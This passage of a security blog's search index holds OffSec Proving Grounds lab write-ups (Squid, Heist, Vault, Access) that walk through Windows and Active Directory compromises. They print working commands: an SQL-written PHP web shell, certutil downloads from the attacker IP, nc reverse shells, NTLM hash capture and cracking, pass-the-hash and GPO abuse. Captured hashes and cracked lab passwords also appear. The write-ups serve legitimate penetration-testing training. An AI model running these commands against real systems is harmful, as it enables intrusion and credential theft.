can be reached through the proxy.\nI configured proxy settings in FoxyProxy, pointing it to port 3128, and then attempted to access the web application.\nFrom the landing page, I found a link to phpmyadmin page.\nI tried the default credentials:\nroot / ''\nand successfully logged in.\nexploitation Using SQL statements, We can read and wirte files if we have sufficient privileges..\nSince I logged in as root, I had the necessary permissions.\nFor example, we can read a file using:\nload_file('c:\\windows\\win.ini'); And write a file using:\nSELECT \"\u003c?php echo \\'\u003cform action=\\\"\\\" method=\\\"post\\\" enctype=\\\"multipart/form-data\\\" name=\\\"uploader\\\" id=\\\"uploader\\\"\u003e\\';echo \\'\u003cinput type=\\\"file\\\" name=\\\"file\\\" size=\\\"50\\\"\u003e\u003cinput name=\\\"_upl\\\" type=\\\"submit\\\" id=\\\"_upl\\\" value=\\\"Upload\\\"\u003e\u003c/form\u003e\\'; if( $_POST[\\'_upl\\'] == \\\"Upload\\\" ) { if(@copy($_FILES[\\'file\\'][\\'tmp_name\\'], $_FILES[\\'file\\'][\\'name\\'])) { echo \\'\u003cb\u003eUpload Done.\u003cb\u003e\u003cbr\u003e\u003cbr\u003e\\'; }else { echo \\'\u003cb\u003eUpload Failed.\u003c/b\u003e\u003cbr\u003e\u003cbr\u003e\\'; }}?\u003e\" INTO OUTFILE 'C:/wamp/www/uploader.php'; Web server’s root directory The root directory for WAMP is C:/wamp/www.\nAfter executing the command, navigate to the URL to confirm that it works.\nNice! Now we can upload a reverse shell and execute it.\nC:\\wamp\\www\u003ewhoami nt authority\\local service privilege escalation At this point, we still couldn’t access the Administrator folder.\nCheck user privileges.\nThe account has the SeImpersonatePrivilege, which is commonly exploitable.\nI moved nc.exe and godpotato.exe to target using web server.\nThe user has write permissions to the directory:\nC:\\wamp\\tmp\nI downloaded the files using certutil:\ncertutil -urlcache -split -f http://192.168.45.202/nc.exe nc.exe certutil -urlcache -split -f http://192.168.45.202/godpotato.exe godpotato.exe Finally, I obtained a reverse shell with SYSTEM privileges.\ngodpotato.exe -cmd \"nc.exe 192.168.45.202 443 -e cmd\" C:\\Users\\Administrator\\Desktop\u003etype proof.txt \u003cproof\u003e",
    "description": "Offsec proving grounds Squid writeup - A penetration testing walkthrough exploiting a Squid proxy to access internal services, gain phpMyAdmin access, upload a web shell, and escalate privileges using GodPotato.",
    "tags": [
      "Squid",
      "Phpmyadmin",
      "Spose",
      "Proxy"
    ],
    "title": "Squid",
    "uri": "/writeup/proving-grounds/squid/index.html"
  },
  {
    "breadcrumb": "Home \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: Bloodhound",
    "uri": "/tags/bloodhound/index.html"
  },
  {
    "breadcrumb": "Home \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: GMSApassword",
    "uri": "/tags/gmsapassword/index.html"
  },
  {
    "breadcrumb": "Home \u003e Writeup \u003e Proving Grounds",
    "content": "initial foothold NMAP scan PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2026-02-25 04:52:37Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: heist.offsec0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: heist.offsec0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 3389/tcp open ms-wbt-server Microsoft Terminal Services |_ssl-date: 2026-02-25T04:54:11+00:00; 0s from scanner time. | ssl-cert: Subject: commonName=DC01.heist.offsec | Not valid before: 2026-02-24T04:50:12 |_Not valid after: 2026-08-26T04:50:12 | rdp-ntlm-info: | Target_Name: HEIST | NetBIOS_Domain_Name: HEIST | NetBIOS_Computer_Name: DC01 | DNS_Domain_Name: heist.offsec | DNS_Computer_Name: DC01.heist.offsec | DNS_Tree_Name: heist.offsec | Product_Version: 10.0.17763 |_ System_Time: 2026-02-25T04:53:31+00:00 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 8080/tcp open http Werkzeug httpd 2.0.1 (Python 3.9.0) |_http-server-header: Werkzeug/2.0.1 Python/3.9.0 |_http-title: Super Secure Web Browser 9389/tcp open mc-nmf .NET Message Framing 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49673/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49674/tcp open msrpc Microsoft Windows RPC 49677/tcp open msrpc Microsoft Windows RPC 49704/tcp open msrpc Microsoft Windows RPC From the scan results, we can see that this machine is a Domain Controller. Several Active Directory–related services are exposed, including LDAP (389), Kerberos (88), SMB (445), and Global Catalog (3268).\nOne interesting service is running on port 8080, which appears to be a web application powered by Flask.\nenumeration WEB The web page contains a URL input field. To test whether the application makes outbound connections, I entered my own IP address and monitored for incoming traffic.\nUsing Responder, I was able to capture NTLM authentication from the user enox.\nsudo responder -I tun0 [HTTP] NTLMv2 Client : 192.168.115.165 [HTTP] NTLMv2 Username : HEIST\\enox [HTTP] NTLMv2 Hash : enox::HEIST:dff6ac54f806b386:84663E057CEEF7EE058596D9C2B8B826:01010000000000006AD8221114A6DC0110A62938E9D3D95400000000020008004C00330039005A0001001E00570049004E002D00410049003300390056003600390033004A0043003200040014004C00330039005A002E004C004F00430041004C0003003400570049004E002D00410049003300390056003600390033004A00430032002E004C00330039005A002E004C004F00430041004C00050014004C00330039005A002E004C004F00430041004C00080030003000000000000000000000000030000098BF0D68BEA36AC69F27F02B4B5580B35A970EAA12F2C2D466BA29E944A8C58C0A001000000000000000000000000000000000000900260048005400540050002F003100390032002E003100360038002E00340035002E003200340037000000000000000000 Cracked the hash using hashcat:\nhashcat -m 5600 -a 0 hash /usr/share/wordlists/rockyou.txt Credentials recovered: enox / california lateral movement I used evil-winrm to log in.\nOn the Desktop, I found a file named todo.txt:\n*Evil-WinRM* PS C:\\Users\\enox\\desktop\u003e cat todo.txt - Setup Flask Application for Secure Browser [DONE] - Use group managed service account for apache [DONE] - Migrate to apache - Debug Flask Application [DONE] - Remove Flask Application - Submit IT Expenses file to admin. [DONE] This suggests that Apache is configured to use a Group Managed Service Account (gMSA).\nLooking in C:\\Users, I found a service account:\nDirectory: C:\\users Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 7/20/2021 4:25 AM Administrator d----- 2/24/2026 11:50 PM enox d-r--- 5/28/2021 3:53 AM Public d----- 9/14/2021 8:27 AM svc_apache$ Service accounts often have elevated privileges, making this a promising target.\nBloodhound I ran BloodHound to analyze privilege escalation paths.\nBloodHound revealed that the user enox has the ReadGMSAPassword permission over svc_apache$.\nThis means we can retrieve the managed password for that account.\nUsing gmsapasswordreader.exe, I extracted the password hashes:\ngmsapasswordreader.exe --accountname svc_apache Calculating hashes for Old Value [*] Input username : svc_apache$ [*] Input domain : HEIST.OFFSEC [*] Salt : HEIST.OFFSECsvc_apache$ [*] rc4_hmac : 555E082FC42C2D7DB6DCE1AE1960A122 [*] aes128_cts_hmac_sha1 : 91BDC8AA9BBA3A281B94460823E3723B [*] aes256_cts_hmac_sha1 : 3904CE07CB1DEED14713BA71A0D1956DE03FF0DDC4EE9185AAC4D0653616764E [*] des_cbc_md5 : 2F0B768CE6EFC419 Calculating hashes for Current Value [*] Input username : svc_apache$ [*] Input domain : HEIST.OFFSEC [*] Salt : HEIST.OFFSECsvc_apache$ [*] rc4_hmac : B4A3125F0CB30FCBB499D4B4EB1C20D2 [*] aes128_cts_hmac_sha1 : 51943C933F7A24126B1C43883866DDB4 [*] aes256_cts_hmac_sha1 : 003367B7C9B89B1717838E9CE2B79C0CD458326E32870F73EC94AF810F4A7E32 [*] des_cbc_md5 : 45C4D9732C9D1FD5 Using Pass-the-Hash:\nevil-winrm -i 192.168.115.165 -u svc_apache$ -H B4A3125F0CB30FCBB499D4B4EB1C20D2\nDo not forget the $ at the end of the username. Authentication will fail without it.\nprivilege escalation Checking privileges:\nPrivilege Name Description State ============================= ============================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled SeRestorePrivilege Restore files and directories Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled I confrimed the user has SeRestorePrivilege.\nThis privilege allows restoring files and directories, which can be abused to overwrite protected system files.\nIn the Documents folder, I found a PowerShell script referencing:\nIt’s telling us to check the github for privsec.\nAbusing SeRestorePrivilege According to the guidance:\n1. Launch PowerShell/ISE with the SeRestore privilege present. 2. Enable the privilege with Enable-SeRestorePrivilege. 3. Rename utilman.exe to utilman.old 4. Rename cmd.exe to utilman.exe 5. Lock the console and press Win+U Okay, according to the note, we will replace utilman.exe file to cmd.exe file.\nThen by interacting with GUI somehow, the cmd.exe will be executed instead of utilman.exe which is suppposed to.\nmv C:\\Windows\\System32\\utilman.exe C:\\Windows\\System32\\utilman.exe.bak mv C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe Then I opened remote desktop to interact.\nrdesktop 192.168.115.165 From the login screen, clicking the Ease of Access (Utility Manager) icon launches utilman.exe.\nSince we replaced it with cmd.exe, a SYSTEM shell is spawned.\nWe now have full SYSTEM access on the Domain Controller!",
    "description": "Heist writeup - Active Directory penetration testing walkthrough covering NTLM capture, gMSA password extraction, lateral movement with BloodHound, and privilege escalation using SeRestorePrivilege.",
    "tags": [
      "SeRestorePrivilege",
      "Bloodhound",
      "ReadGMSAPassword",
      "Responder",
      "GMSApassword",
      "Utilman"
    ],
    "title": "Heist",
    "uri": "/writeup/proving-grounds/heist/index.html"
  },
  {
    "breadcrumb": "Home \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: ReadGMSAPassword",
    "uri": "/tags/readgmsapassword/index.html"
  },
  {
    "breadcrumb": "Home \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: Responder",
    "uri": "/tags/responder/index.html"
  },
  {
    "breadcrumb": "Home \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: SeRestorePrivilege",
    "uri": "/tags/serestoreprivilege/index.html"
  },
  {
    "breadcrumb": "Home \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: Utilman",
    "uri": "/tags/utilman/index.html"
  },
  {
    "breadcrumb": "Home \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: DACL",
    "uri": "/tags/dacl/index.html"
  },
  {
    "breadcrumb": "Home \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: Impacket-Dacledit",
    "uri": "/tags/impacket-dacledit/index.html"
  },
  {
    "breadcrumb": "Home \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: Impacket-Owneredit",
    "uri": "/tags/impacket-owneredit/index.html"
  },
  {
    "breadcrumb": "Home \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: Ntlm_theft",
    "uri": "/tags/ntlm_theft/index.html"
  },
  {
    "breadcrumb": "Home \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: SharpGPOAbuse",
    "uri": "/tags/sharpgpoabuse/index.html"
  },
  {
    "breadcrumb": "Home \u003e Writeup \u003e Proving Grounds",
    "content": "initial foothold nmap PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2026-02-24 09:18:25Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3389/tcp open ms-wbt-server Microsoft Terminal Services | ssl-cert: Subject: commonName=DC.vault.offsec | Not valid before: 2026-02-23T09:16:03 |_Not valid after: 2026-08-25T09:16:03 | rdp-ntlm-info: | Target_Name: VAULT | NetBIOS_Domain_Name: VAULT | NetBIOS_Computer_Name: DC | DNS_Domain_Name: vault.offsec | DNS_Computer_Name: DC.vault.offsec | DNS_Tree_Name: vault.offsec | Product_Version: 10.0.17763 |_ System_Time: 2026-02-24T09:19:19+00:00 |_ssl-date: 2026-02-24T09:20:33+00:00; 0s from scanner time. 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf .NET Message Framing 49666/tcp open unknown 49668/tcp open unknown 49673/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49674/tcp open unknown 49679/tcp open unknown 49703/tcp open unknown I started by checking for guest access on the target machine.\nenumeration SMB I checked that I have a guest access.\ncrackmapexec smb 192.168.115.172 -u 'guest' -p '' --shares SMB 192.168.115.172 445 DC [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:vault.offsec) (signing:True) (SMBv1:False) SMB 192.168.115.172 445 DC [+] vault.offsec\\guest: SMB 192.168.115.172 445 DC [+] Enumerated shares SMB 192.168.115.172 445 DC Share Permissions Remark SMB 192.168.115.172 445 DC ----- ----------- ------ SMB 192.168.115.172 445 DC ADMIN$ Remote Admin SMB 192.168.115.172 445 DC C$ Default share SMB 192.168.115.172 445 DC DocumentsShare READ,WRITE SMB 192.168.115.172 445 DC IPC$ READ Remote IPC SMB 192.168.115.172 445 DC NETLOGON Logon server share SMB 192.168.115.172 445 DC SYSVOL Logon server share The output confirmed that I have READ/WRITE permissions on the DocumentsShare.\nSince I have write access, I can attempt to capture an NTLM hash by forcing a user to authenticate to my machine.\nI used ntlm-theft to generate a set of malicious files. If a user interacts with any of these files, Responder will capture their hash.\nexploitation Craft the payload. python3 ntlm_theft.py -g all -s 192.168.45.247 -f lure Start Responder sudo responder -I tun0 -v Upload the files. prompt off mput * Shortly after, a connection was triggered, and I captured the NTLMv2 hash for the user anirudh\n[SMB] NTLMv2-SSP Client : 192.168.115.172 [SMB] NTLMv2-SSP Username : VAULT\\anirudh [SMB] NTLMv2-SSP Hash : anirudh::VAULT:40babecc932bb0e4:02EAF46724C05C5D92F5FA10E91CCC7D:010100000000000000715745BEA5DC0193C7B6FF64C22AFD00000000020008004C0039004100450001001E00570049004E002D004700310042003500520051003700440031003200380004003400570049004E002D00470031004200350052005100370044003100320038002E004C003900410045002E004C004F00430041004C00030014004C003900410045002E004C004F00430041004C00050014004C003900410045002E004C004F00430041004C000700080000715745BEA5DC01060004000200000008003000300000000000000001000000002000001830F0C706803F0173332094F5B2BB5FB0C4DAD79922348512363CC7DC51C8100A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200340037000000000000000000 I cracked the captured hash and retrieved the password: SecureHM\nWith these credentials, I gained initial access via evil-winrm:\nevil-winrm -i 192.168.115.172 -u 'anirudh' -p 'SecureHM' Manual methods. You can also do this manually by creating a .url file that points to your attacker IP.\ncat @hax.url [InternetShortcut] URL=anything WorkingDirectory=anything IconFile=\\\\attacker_ip\\%USERNAME%.icon IconIndex=1 privilege escalation Running whoami /priv showed that the user has SeBackupPrivilege. However, after some investigation, this turned out to be a rabbit hole.\nI spent some time on it.\nGPO Abuse via BloodHound Using BloodHound, I discovered that the user anirudh has write permissions over the Default Domain Policy.\nTo escalate privileges, I took ownership of the GPO and modified the DACL using Impacket’s owneredit and dacledit. Then, I used SharpGPOAbuse.exe to add anirudh to the local Administrators group.\nimpacket-owneredit -action write -new-owner 'anirudh' -target-dn 'CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=VAULT,DC=OFFSEC' 'vault'/'anirudh':'SecureHM' [*] Current owner information below [*] - SID: S-1-5-21-537427935-490066102-1511301751-512 [*] - sAMAccountName: Domain Admins [*] - distinguishedName: CN=Domain Admins,CN=Users,DC=vault,DC=offsec [*] OwnerSid modified successfully! And give all privileges to the user.\nimpacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'anirudh' -target-dn 'CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=VAULT,DC=OFFSEC' 'vault'/'anirudh':'SecureHM' -dc-ip 192.168.115.172 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies [*] DACL backed up to dacledit-20260225-104610.bak [*] DACL modified successfully! The user anirudh is owner of default domain policy.\nWith Powerview, we can confirm the user has permissions on it.\n*Evil-WinRM* PS C:\\Users\\anirudh\u003e Get-GPPermission -Guid 31b2f340-016d-11d2-945f-00c04fb984f9 -TargetType User -TargetName anirudh Trustee : anirudh TrusteeType : User Permission : GpoEditDeleteModifySecurity Inherited : False Now, let’s modify the policy using SharpGPOAbuse.exe!\n.\\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName \"Default Domain Policy\" [+] Domain = vault.offsec [+] Domain Controller = DC.vault.offsec [+] Distinguished Name = CN=Policies,CN=System,DC=vault,DC=offsec [+] SID Value of anirudh = S-1-5-21-537427935-490066102-1511301751-1103 [+] GUID of \"Default Domain Policy\" is: {31B2F340-016D-11D2-945F-00C04FB984F9} [+] File exists: \\\\vault.offsec\\SysVol\\vault.offsec\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\Machine\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf [+] The GPO does not specify any group memberships. [+] versionNumber attribute changed successfully [+] The version number in GPT.ini was increased successfully. [+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle. [+] Done! Now anirudh became administrator!\nAfter successfully modifying the GPO, I forced a policy update.\ngpupdate /force\nWith the policy applied, anirudh was added to the local Administrators group. I logged back in, verified my identity with whoami /groups, and successfully retrieved the root flag from the Administrator’s desktop.",
    "description": "Vault writeup - Learn how to escalate privileges in an Active Directory environment by exploiting SMB guest write access and GPO abuse. This walkthrough covers NTLM hash capturing with Responder, ntlm-theft, and leveraging SharpGPOAbuse to gain local admin rights on a Windows Domain Controller.",
    "tags": [
      "Responder",
      "DACL",
      "Bloodhound",
      "Ntlm_theft",
      "SharpGPOAbuse",
      "Impacket-Owneredit",
      "Impacket-Dacledit"
    ],
    "title": "Vault",
    "uri": "/writeup/proving-grounds/vault/index.html"
  },
  {
    "breadcrumb": "Home \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: .Htaccess",
    "uri": "/tags/.htaccess/index.html"
  },
  {
    "breadcrumb": "Home \u003e Writeup \u003e Proving Grounds",
    "content": "Initial foothold PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7) |_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7 |_http-title: Access The Event | http-methods: |_ Potentially risky methods: TRACE 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2026-02-24 01:27:40Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name) 443/tcp open ssl/http Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7) | tls-alpn: |_ http/1.1 | ssl-cert: Subject: commonName=localhost | Not valid before: 2009-11-10T23:48:47 |_Not valid after: 2019-11-08T23:48:47 |_ssl-date: TLS randomness does not represent time | http-methods: |_ Potentially risky methods: TRACE |_http-title: Access The Event |_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC 49670/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49671/tcp open msrpc Microsoft Windows RPC 49674/tcp open msrpc Microsoft Windows RPC 49679/tcp open msrpc Microsoft Windows RPC 49701/tcp open msrpc Microsoft Windows RPC 49789/tcp open msrpc Microsoft Windows RPC Ports 80 and 443 are open. Let’s start by enumerating the web server.\nEnumeration WEB whatweb http://192.168.115.187/ http://192.168.115.187/ [200 OK] Apache[2.4.48], Bootstrap, Country[RESERVED][ZZ], Email[info@example.com], Frame, HTML5, HTTPServer[Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7], IP[192.168.115.187], Lightbox, OpenSSL[1.1.1k], PHP[8.0.7], Script, Title[Access The Event] I checked the versions of the web components, but no known vulnerabilities were found for these specific versions.\nHowever, I confirmed that the site is running on an Apache server and is developed in PHP.\nObserve functionality of the web.\nI found a file upload function on the “Buy Tickets” page.\nThe upload filter can be easily bypassed by changing the extension to xxx.php.gif\nHowever, neither a web shell nor a reverse shell would execute.\nExploitation Since the target is an Apache server, we can upload a .htaccess file to manipulate server configurations.\nFor example, a file type can be added like below.\nAddType application/x-httpd-php .gif By adding this line, gif file extension will be treated as php file.\nwe can even create a new extension.\nAddType application/x-httpd-php .test After uploading the crafted .htaccess file, it remains hidden in the uploads directory, but the configuration takes effect.\nI uploaded a php revshell to the web site again, and this time managed to get a shell as svc_apache user.\nLateral movement No local.txt flag in svc_apache users’ desktop folder.\nTried kerberoast using rubeus and found other credential.\nrubeus.exe kerberoast /nowrap Rubeus is highly effective for gathering credentials when you have initial access to a target system without cleartext passwords.\n[*] SamAccountName : svc_mssql [*] DistinguishedName : CN=MSSQL,CN=Users,DC=access,DC=offsec [*] ServicePrincipalName : MSSQLSvc/DC.access.offsec [*] PwdLastSet : 5/21/2022 5:33:45 AM [*] Supported ETypes : RC4_HMAC_DEFAULT [*] Hash : $krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec@access.offsec*$47E98E66E07AE25B066B0D0CCAD15639$87C81FBB98E7F02BBA8AEE760A539F86EFD5B7460DFB9A740109435E935C1577009E8E712A2101CCE112C55AC8EC10F2A12B4DA839ECC8139D05195AA3AE7C91E7B5289759E056CB89F818BF57742A477BA77987ED7EF563C2E4BBDF14D9406A0449ECC330CA4396D9969190F5C84D93359EDEB2FBDD3CFC0B869DBC3877136501E0CB4BAB7A728F3247EB765DD41BCEC9E62F9961CDF1079E0C475BB71F4EB2A68CB8DFAFC5C1E0ACCEEBEBE99051E5957703A24FAD37C3DBD635EFF8722602F9DAB167C61543475E558D7FCD56DA172D7881CECC6854CE755A97916A0DFF98DFA2929AF5E10BA8DC0EB25824CFCA5D7B1B05CCA5D4DBB5AB8FA445220C9A4854F39873E7F497E9CEB824CDF4AF8B47550EB2B134517352B250F5D17CBECEB0E819811B15823BF301DF3B5F675027780FF2C148E2C54923C5A60B2916E6D0BD8070019860C67F8BA68A6FC357359DD2B47790F139DEB801B1F258ECFFE2BC96C3E68833E87D3E29FA956F4BCBB367B04EB43AF6C6FD4C3A6A7A9392594131D738833BCF3E372B516C89C59A0721C0EB7B1CAB03A5677AB2F96E7463E35393B9C995ABE8B85DFCFAD84F67A0B8F2A7033C66D49C0C2EB40E3726C9CEEEEA297F68077B511E194EA7881A2A3B62875E53C508FB48E54FAE67BDB95DA83F75D2E061E260B845E93C2472989A4D512030445CD5C9A896367F59900B78A187205AF9159430A0FDC2F07706B3D6D49F25EF980B9B6CB9CD42E28EFCDB10170EE89940E2996C4DBAC066A5A7D41564AB4DF7B134709BFC96C1D80FBB07FC7993616925C3DDCEA964ECB18E887BA0C2CAC30AE8903FCF9D2DDD8B3E382C0362D358CB33624BDB583C4C6363BB0A7CB04713F9B42AB29C197FCE31B945BDB1231549A6B9206A4AF05B37EB02BF33501084583DAEEA269A21C7E4328E2D488E52590B2BAC2C3E28F70E8E7EA2C65A9C704BCB416C007F823D66B4E1B669CC8CF25AE8F9A1B4FAF004F3C3D80BFA4A2BE5E891CC9BCE645ECC22B135827FC073FDB6E4353DDDD049BDC41DF5A70CD4EF3BA84B3DB4991753B107F346B6ED83FBFDC0950483F95C4AD6F021AE499A8CA1CE2445632844D566FDF7D7513E8E85167CC4CBFAE0F21C8EE7C772E1A742EB0C68D9AD12A064334BAB8FB4FF48BF5CAB6CC4B9DEE9F540C2832125E505D6AB45301E3970D23015812395681A80F8E43D8E1A404E963B9EC32C5BE357EC5DD480998ED8A1018E0DD0AF8B5B446C2920DF7691781B8AD5BCFCC4BF1D9C8D2A50418F140F8B29B10AEFF762A8FFEDC86F19D69A5EBC28D7A451FBEBAE79F50BBF3C09F07D42D4F267091DA4574FB86664A6CCBC10C6B3A6DEEC00FE28B7E229440A5B30008B8349FC953E5FADC0556AEDE06449BB87C275CF9D2C0C05EDFCD12686B516136D921C132E3E64067B58FFCDD9ED3F71EAFC10151C2EA93B4C2D11E0709B1DD994E339056BCED25906EBACAF271A5BC48BD0F7D50EEBB9A2AECB685C376F099D60E6862B7B5696D1A41567DC6FE66254EB1132D5BD5B9BC3BD0331CC5542982194EFBFD4D77CBD5496284B56E7147E21ED33C9E5BCD5C904DBADCFB3620A9237DE3FAE8B After cracking the captured hash, I obtained the password: trustno1\nI used the RunsasCs to spawn a shell as the svc_mssql user.\nRunasCs.exe svc_mssql trustno1 \"cmd /c C:/Users/public/nc.exe attacker_IP 443 -e cmd\" -t 0 Execute a reverse shell command as user svc_mssql\nC:\\Windows\\system32\u003ewhoami whoami access\\svc_mssql Privilege Escalation Check svc_mssql’s priviliege.\nPRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ================================ ======== SeMachineAccountPrivilege Add workstations to domain Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeManageVolumePrivilege Perform volume maintenance tasks Disabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled The SeManageVolumePrivilege is a well-known privilege escalation vector.\nSimply running the tool SeManageVolumeExploit, svc_mssql can access all resources like administrator.\nFor further information gathering, you may transfer sensitive files such as SAM, SYSTEM from system32 folder.",
    "description": "Access writeup - An attacker achieve initial access by uploading crafted files. After getting the initial shell, other credentials found using kerberoast attack. Finally, An attacker can escalage privilege bu exploiting SeManageVolumePrivilege.",
    "tags": [
      ".Htaccess",
      "RunasCs",
      "SeManageVolumePrivilege"
    ],
    "title": "Access",
    "uri": "/writeup/proving-grounds/access/index.html"
  },
  {
    "breadcrumb": "Home \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: RunasCs",
    "uri": "/tags/runascs/index.html"
  },
  {
    "breadcrumb": "Home \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: SeManageVolumePrivilege",
    "uri": "/tags/semanagevolumeprivilege/index.html"
  },
  {
    "breadcrumb": "",
    "content": "Welcome!! Posts\rWriteup",
    "description": "Welcome!! Posts\rWriteup",
    "tags": [],
    "title": "Home",
    "uri": "/index.html"
  },
  {
    "breadcrumb": "Home",
    "content": "Cheat Sheets \u0026 Tips\nActive Directory File Transfer OSCP_cheatsheet Pivoting Stabilize a reverse shell WebDAV Exploitation with davtest",
    "description": "Cheat Sheets \u0026 Tips\nActive Directory File Transfer OSCP_cheatsheet Pivoting Stabilize a reverse shell WebDAV Exploitation with davtest",
    "tags": [],
    "title": "Posts",
    "uri": "/posts/index.html"
  },
  {
    "breadcrumb": "Home",
    "content": "프라이빗 창고",
    "description": "프라이빗 창고",
    "tags": [],
    "title": "Private",
    "uri": "/private/index.html"
  },
  {
    "breadcrumb": "Home \u003e Writeup",
    "content": "Offsec’s proving grounds writeups.\nAccess\nAccess writeup - An attacker achieve initial access by uploading crafted files. After getting the initial shell, other credentials found using kerberoast attack. Finally, An attacker can escalage privilege bu exploiting SeManageVolumePrivilege.\nHeist\nHeist writeup - Active Directory penetration testing walkthrough covering NTLM capture, gMSA password extraction, lateral movement with BloodHound, and privilege escalation using SeRestorePrivilege.\nNickel\nNickel writeup – Windows exploitation walkthrough covering HTTP enumeration, credential discovery via process listing, SSH access, PDF password cracking, and SYSTEM command execution.\nSnookums\nA comprehensive writeup for the OffSec Snookums machine. Learn how to exploit an RFI vulnerability in SimplePHPGallery for an initial foothold, extract database credentials, and achieve root access by exploiting a writable /etc/passwd file.\nSquid\nOffsec proving grounds Squid writeup - A penetration testing walkthrough exploiting a Squid proxy to access internal services, gain phpMyAdmin access, upload a web shell, and escalate privileges using GodPotato.\nVault\nVault writeup - Learn how to escalate privileges in an Active Directory environment by exploiting SMB guest write access and GPO abuse. This walkthrough covers NTLM hash capturing with Responder, ntlm-theft, and leveraging SharpGPOAbuse to gain local admin rights on a Windows Domain Controller.",
